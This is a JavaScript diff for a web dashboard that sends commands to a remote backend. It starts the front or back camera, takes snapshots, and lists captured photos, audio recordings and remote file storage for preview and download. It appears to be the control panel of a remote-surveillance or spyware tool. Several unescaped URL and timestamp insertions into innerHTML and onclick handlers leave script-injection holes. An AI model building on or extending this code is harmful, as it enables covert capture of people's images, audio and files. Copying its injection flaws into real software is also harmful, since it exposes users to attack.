@@ -1,5 +1,6 @@
 const API_BASE = "https://sweetdreambackend.onrender.com"; // cloud backend
 
+// ============ Helpers ============
 function escapeHtml(unsafe) {
   if (!unsafe) return "";
   return unsafe
@@ -11,30 +12,58 @@ function escapeHtml(unsafe) {
     .replace(/'/g, "&#039;");
 }
 
-// ============ Helpers ============
-function formatTimestamp(ts) {
-  if (!ts) return "";
-  const d = new Date(ts);
-  return d.toLocaleString();
+function formatTimestamp(tsOrName) {
+  if (!tsOrName) return "";
+  // Try parse filename like snap_172837473.jpg
+  if (typeof tsOrName === "string" && tsOrName.startsWith("snap_")) {
+    const num = tsOrName.replace(/[^\d]/g, "");
+    if (num) return new Date(parseInt(num)).toLocaleString();
+  }
+  try {
+    return new Date(tsOrName).toLocaleString();
+  } catch {
+    return tsOrName;
+  }
 }
 
-function openPreview(url, type = "image") {
+function openPreview(url, type = "file") {
   const modal = document.createElement("div");
   modal.className = "modal";
+  let content = "";
+  if (type === "audio") {
+    content = `<audio controls src="${url}" style="width:100%"></audio>`;
+  } else if (type === "image") {
+    content = `<img src="${url}" style="max-width:100%;max-height:80vh;"/>`;
+  } else {
+    content = `<iframe src="${url}" style="width:100%;height:80vh;"></iframe>`;
+  }
   modal.innerHTML = `
     <div class="modal-content">
       <span class="close" onclick="this.parentElement.parentElement.remove()">×</span>
-      ${
-        type === "audio"
-          ? `<audio controls src="${url}" style="width:100%"></audio>`
-          : `<img src="${url}" style="max-width:100%;max-height:80vh;"/>`
-      }
+      ${content}
       <div style="margin-top:8px;text-align:right">
         <a href="${url}" download class="download-btn">⬇️ Download</a>
       </div>
     </div>
   `;
   document.body.appendChild(modal);
+}
+
+// ============ API Command Helper ============
+async function sendCommand(commandType, payload = {}) {
+  try {
+    const res = await fetch(`${API_BASE}/commands`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ commandType, payload }),
+    });
+    if (!res.ok) throw new Error(`HTTP ${res.status}`);
+    const data = await res.json();
+    logEvent(`📡 Sent command: ${commandType}`, JSON.stringify(payload));
+    return data;
+  } catch (err) {
+    logEvent(`❌ Failed to send command ${commandType}`, err.message);
+  }
 }
 
 // ============ Events ============
@@ -62,6 +91,22 @@ async function loadEvents() {
   }
 }
 
+function logEvent(type, data) {
+  const el = document.getElementById("events");
+  el.innerHTML =
+    `<div>🔔 ${escapeHtml(type)} - ${escapeHtml(data)}</div>` + el.innerHTML;
+}
+
+// ============ Camera ============
+document.getElementById("btnCameraFront").onclick = () =>
+  sendCommand("camera:start", { lens: "front" });
+document.getElementById("btnCameraBack").onclick = () =>
+  sendCommand("camera:start", { lens: "back" });
+document.getElementById("btnCameraStop").onclick = () =>
+  sendCommand("camera:stop");
+document.getElementById("btnCameraSnap").onclick = () =>
+  sendCommand("camera:snap", { lens: "current" });
+
 // ============ Camera Gallery ============
 async function loadCameraGallery() {
   const el = document.getElementById("cameraGallery");
@@ -71,11 +116,12 @@ async function loadCameraGallery() {
     const files = (await res.json()).sort((a, b) => b.name.localeCompare(a.name));
     el.innerHTML = `
       <table>
-        <tr><th>File</th><th>Action</th></tr>
+        <tr><th>File</th><th>Time</th><th>Action</th></tr>
         ${files
           .map(
             f => `<tr>
               <td>${escapeHtml(f.name)}</td>
+              <td>${formatTimestamp(f.name)}</td>
               <td>
                 <button onclick="openPreview('${API_BASE}${f.url}', 'image')">👁 Preview</button>
                 <a href="${API_BASE}${f.url}" download>⬇️ Download</a>
@@ -98,11 +144,12 @@ async function loadAudioGallery() {
     const files = (await res.json()).sort((a, b) => b.name.localeCompare(a.name));
     el.innerHTML = `
       <table>
-        <tr><th>File</th><th>Action</th></tr>
+        <tr><th>File</th><th>Time</th><th>Action</th></tr>
         ${files
           .map(
             f => `<tr>
               <td>${escapeHtml(f.name)}</td>
+              <td>${formatTimestamp(f.name)}</td>
               <td>
                 <button onclick="openPreview('${API_BASE}${f.url}', 'audio')">▶️ Play</button>
                 <a href="${API_BASE}${f.url}" download>⬇️ Download</a>
@@ -190,7 +237,7 @@ async function loadStorage(path = "/") {
                 <td>${escapeHtml(i.name)}</td>
                 <td>File</td>
                 <td>
-                  <button onclick="openPreview('${API_BASE}${i.url}', 'image')">👁 Preview</button>
+                  <button onclick="openPreview('${API_BASE}${i.url}', 'file')">👁 Preview</button>
                   <a href="${API_BASE}${i.url}" download>⬇️ Download</a>
                 </td>
               </tr>`;
